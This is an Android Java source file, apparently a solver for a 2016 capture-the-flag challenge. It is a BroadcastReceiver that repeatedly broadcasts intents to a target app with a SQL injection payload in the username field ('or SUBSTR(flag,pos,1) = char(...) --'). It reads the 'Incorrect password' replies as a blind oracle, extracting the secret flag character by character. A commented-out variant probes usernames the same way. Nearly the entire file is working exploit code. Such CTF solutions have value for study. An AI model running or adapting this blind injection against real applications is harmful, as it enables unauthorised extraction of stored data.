package com.jeffxx.gctf2016;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Created by cychao on 2016/4/30.
 */
public class MyBroadcastReceiver extends BroadcastReceiver {
    Integer pos = 1;
    int lower = 20;
    int  upper = 128;
    String flag = "";
    @Override
    public void onReceive(Context context, Intent intent) {

        String result = intent.getStringExtra("msg");
        // failed:  Incorrect password
        // success: loggin
        //Log.d("Result",result);
        String sql_payload = "";
        if (result.startsWith("Incorrect")) {
            char c = (char) upper;
        //    Log.d("Char", ""+c);

            flag += c;
            Log.d("Partial FLAG", flag);
            if (c == '}') {
                Log.d("FLAG:",flag);
                return;
            }
            pos +=1;
            upper = 128;
        }else{
            //lower = (lower+upper)/2 ;
            upper = upper -1;
        }
/*
        if (upper ==lower+1) {

            Log.d("Char",upper.toString());

            flag += Character.toChars(upper);
            Log.d("Partial FLAG", flag);
            if (upper.toString() == "}") {
                Log.d("FLAG:",flag);
                return;
            }
            lower = 20;
            upper = 128;
            pos +=1;
        }
        */
        if(pos <=160 ){
            Integer tmp = (upper+lower) / 2;
            Intent tmpintent = new Intent("com.bobbytables.ctf.myapplication_INTENT");
            //Log.d("SQL", "hello\" or HEX(SUBSTR(username,"+pos+",1)) < char( "+tmp+") --");
            //Log.d("Bound", "lower:" + lower + " upper:" + upper);
            //tmpintent.putExtra("username", "hello\" or HEX(SUBSTR(username,"+pos+",1)) < char( "+tmp+") --");
            tmpintent.putExtra("username", "hello\" or SUBSTR(flag,"+pos+",1) = char( "+upper+") --");
            tmpintent.putExtra("password", "password");
            context.sendBroadcast(tmpintent);
         //   Log.d("broadcast", "Send!");
        }


    }

}